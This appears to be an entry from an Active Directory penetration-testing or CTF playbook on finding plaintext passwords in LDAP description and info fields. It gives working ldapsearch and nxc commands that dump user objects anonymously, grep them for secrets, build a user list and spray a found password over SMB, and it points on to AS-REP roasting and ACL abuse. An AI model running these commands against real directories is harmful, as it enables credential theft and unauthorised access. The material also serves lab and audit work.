title: Creds in LDAP Attributes — description / info Fields
body:
Before you spray, brute, or roast — READ. Anonymous or low-priv LDAP binds expose every user object, and admins love stashing plaintext passwords in free-text attributes: description, info, comment, userPassword, and the GPP cpassword in SYSVOL.

The description field is the classic. A helpdesk note like "Password set to Welcome123! at user's request, change on next login" is a real account password sitting in cleartext, readable by anyone who can bind to LDAP — often no creds required at all (389 anonymous bind).

WHY THIS IS FIRST, NOT LAST:
  - It's free. No lockout risk, no noise, no cracking.
  - One found password becomes the seed for a spray across every user (people reuse, and helpdesk sets the same temp password for batches of accounts).
  - It frequently IS the intended foothold on AD boxes — the whole 'initial access' step is reading a field.

WHAT TO GREP FOR after dumping every person object:
  - description / info / comment — free-text notes
  - 'pass', 'pwd', 'temp', 'welcome', 'change', 'reset' — helpdesk language
  - userPassword — sometimes populated and base64-encoded

Pair this with building a clean users.txt from sAMAccountName in the same sweep — you walk away with both a user list AND any leaked secret in a single pass.
cmd:
# ════════════════════════════════════════════════════════════
# DUMP every person object (anonymous bind — no creds needed)
# ════════════════════════════════════════════════════════════
ldapsearch -x -H ldap://$ip -b "dc=DOMAIN,dc=TLD" "(objectClass=person)"
#   -x                 simple (anonymous) auth
#   -b                 base DN — build from the domain (corp.local -> dc=corp,dc=local)
#   no -D/-w           = anonymous; if it refuses, you need any low-priv cred

# ════════════════════════════════════════════════════════════
# GREP the dump for leaked secrets
# ════════════════════════════════════════════════════════════
ldapsearch -x -H ldap://$ip -b "dc=DOMAIN,dc=TLD" "(objectClass=person)" \
  | grep -iE 'description|info|comment|userPassword|pass|pwd|temp|welcome|reset'

# ════════════════════════════════════════════════════════════
# BUILD users.txt from the same sweep (sAMAccountName -> one per line)
# ════════════════════════════════════════════════════════════
ldapsearch -x -H ldap://$ip -b "dc=DOMAIN,dc=TLD" "(objectClass=person)" sAMAccountName \
  | awk '/^sAMAccountName:/{print $2}' > users.txt
cat users.txt

# ════════════════════════════════════════════════════════════
# AUTHENTICATED variant (more attributes visible once you have any cred)
# ════════════════════════════════════════════════════════════
ldapsearch -x -H ldap://$ip -D "user@DOMAIN.TLD" -w 'PASSWORD' \
  -b "dc=DOMAIN,dc=TLD" "(description=*)" sAMAccountName description

# nxc convenience — pull descriptions directly:
nxc ldap $ip -u user -p 'PASSWORD' -M get-desc-users

# ════════════════════════════════════════════════════════════
# FOUND A PASSWORD? Seed a spray across the whole user list (one spray = one lockout window)
# ════════════════════════════════════════════════════════════
nxc smb $ip -u users.txt -p 'FOUND_PASSWORD' --continue-on-success
#   --continue-on-success  keep going after the first [+] so you catch reuse
warn: Anonymous LDAP binds are often disabled — if -x with no -D returns nothing, you need any valid low-priv credential to read user objects. Also: a description-field password may be stale (the 'change on next login' note means it might already be rotated). Always validate the hit with nxc before building a plan around it.

choices.label: Found a password — spray it across all users
Spray hit — pivot with the new credential
Got usernames only — AS-REP roast them
Have a cred now — authenticated LDAP / PowerView enum
Check what this user can abuse (ACLs, LAPS)
